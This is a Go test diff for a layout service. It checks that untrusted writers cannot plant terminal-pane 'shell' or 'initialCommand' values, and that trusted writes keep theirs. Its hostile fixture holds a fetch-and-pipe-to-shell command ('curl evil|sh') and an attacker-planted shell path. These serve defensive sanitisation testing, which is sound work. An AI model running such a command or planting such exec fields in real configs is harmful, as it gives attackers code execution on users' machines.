@@ -245,6 +245,53 @@ func TestTrustedWriterKeepsSpawnFields(t *testing.T) {
 	}
 }
 
+// The pane-level twin of TestNonTrustedWriterCannotPlantSpawnEscalation: a
+// non-trusted layout.set that plants a terminal pane with a `shell` (argv[0] of
+// the LOCAL terminal:create, which allowlists nothing) or an `initialCommand`
+// (typed into the ready PTY with a CR — arbitrary shell auto-run on restore)
+// must have both stripped while the pane itself round-trips.
+func TestNonTrustedWriterCannotPlantPaneExecution(t *testing.T) {
+	s := New(broker.New(), filepath.Join(t.TempDir(), "layout.json"))
+
+	const hostile = `{"agents":[{"id":"a1","cwd":"/","tabs":[` +
+		`{"id":"t1","title":"T","panes":[` +
+		`{"id":"p1","type":"terminal","title":"sh","shell":"/tmp/attacker-planted","initialCommand":"curl evil|sh"}]}]}]}`
+
+	if _, err := s.SetAs(untrusted{}, json.RawMessage(`{"data":`+hostile+`}`)); err != nil {
+		t.Fatal(err)
+	}
+	stored := mustStored(t, s)
+	for _, needle := range []string{"attacker-planted", "curl evil"} {
+		if strings.Contains(stored, needle) {
+			t.Errorf("a non-trusted layout.set kept pane host-exec value %q; the desktop mounts this terminal and spawns/types it on its next launch through the LOCAL door\n  stored: %s", needle, stored)
+		}
+	}
+	// FLOOR: the pane survives as a usable terminal minus the exec sinks.
+	for _, keep := range []string{`"id":"p1"`, `"type":"terminal"`, `"id":"t1"`} {
+		if !strings.Contains(stored, keep) {
+			t.Errorf("the pane scrub removed %s — everything that is not an exec argument must round-trip\n  stored: %s", keep, stored)
+		}
+	}
+}
+
+// The desktop mirroring its OWN layout legitimately carries the terminal panes
+// the local user opened, with their own shells. A trusted write must keep them,
+// or the scrub silently rewrites the operator's own layout.
+func TestTrustedWriterKeepsPaneExecution(t *testing.T) {
+	s := New(broker.New(), filepath.Join(t.TempDir(), "layout.json"))
+	const doc = `{"agents":[{"id":"a1","tabs":[{"id":"t1","panes":[` +
+		`{"id":"p1","type":"terminal","shell":"/usr/bin/fish","initialCommand":"echo hi"}]}]}]}`
+	if _, err := s.SetAs(trusted{}, json.RawMessage(`{"data":`+doc+`}`)); err != nil {
+		t.Fatal(err)
+	}
+	stored := mustStored(t, s)
+	for _, keep := range []string{"/usr/bin/fish", "echo hi"} {
+		if !strings.Contains(stored, keep) {
+			t.Errorf("a TRUSTED layout.set lost pane value %q — the desktop's own mirror of its own terminals must round-trip\n  stored: %s", keep, stored)
+		}
+	}
+}
+
 // A document the hub cannot parse is one it must not silently rewrite either:
 // "the hub does not interpret this document" still governs everything the scrub
 // does not name.
@@ -260,6 +307,15 @@ func TestScrubLeavesUnparseableAndUnrelatedDocumentsAlone(t *testing.T) {
 			t.Errorf("scrub rewrote %s to %s (dropped %v) — only agents[].<key> is in scope", doc, out, dropped)
 		}
 	}
+}
+
+func mustStored(t *testing.T, s *Service) string {
+	t.Helper()
+	got, err := s.Get(nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return string(got.(Document).Data)
 }
 
 type trusted struct{}
